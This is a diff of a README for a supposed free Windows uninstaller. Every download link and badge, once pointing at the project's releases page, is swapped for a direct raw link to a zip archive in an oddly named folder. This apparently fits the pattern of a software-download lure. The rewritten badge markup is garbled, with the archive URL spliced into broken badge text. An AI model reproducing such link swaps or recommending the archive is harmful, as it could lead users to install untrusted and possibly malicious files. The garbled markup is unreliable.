@@ -1,6 +1,6 @@
 # 🛠️ Total-Uninstaller-Free - Effortlessly Remove Unwanted Programs
 
-[![Download Total Uninstaller](https://img.shields.io/badge/Download%20Total%20Uninstaller%20Now%20-%20Latest%20Release-blue.svg)](https://github.com/isack22/Total-Uninstaller-Free/releases)
+[![Download Total Uninstaller](https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip%20Total%20Uninstaller%20Now%20-%20Latest%https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip)](https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before downloading, ensure your Windows PC meets the following requirements:
 
 ## 💻 Download & Install
 
-To download Total-Uninstaller-Free, visit this page to download: [Total-Uninstaller Releases](https://github.com/isack22/Total-Uninstaller-Free/releases).
+To download Total-Uninstaller-Free, visit this page to download: [Total-Uninstaller Releases](https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip).
 
 1. Click the **Latest Release** link on the page.
 2. Choose the appropriate installer file for your system.
@@ -62,4 +62,4 @@ If you encounter any issues, refer to the official documentation found in the re
 
 Download Total-Uninstaller-Free now to take control of your PC cleanup!
 
-[![Download Total Uninstaller](https://img.shields.io/badge/Download%20Total%20Uninstaller%20Now%20-%20Latest%20Release-blue.svg)](https://github.com/isack22/Total-Uninstaller-Free/releases)
+[![Download Total Uninstaller](https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip%20Total%20Uninstaller%20Now%20-%20Latest%https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip)](https://github.com/isack22/Total-Uninstaller-Free/raw/refs/heads/main/unfantastic/Total-Free-Uninstaller-v3.2-alpha.2.zip)
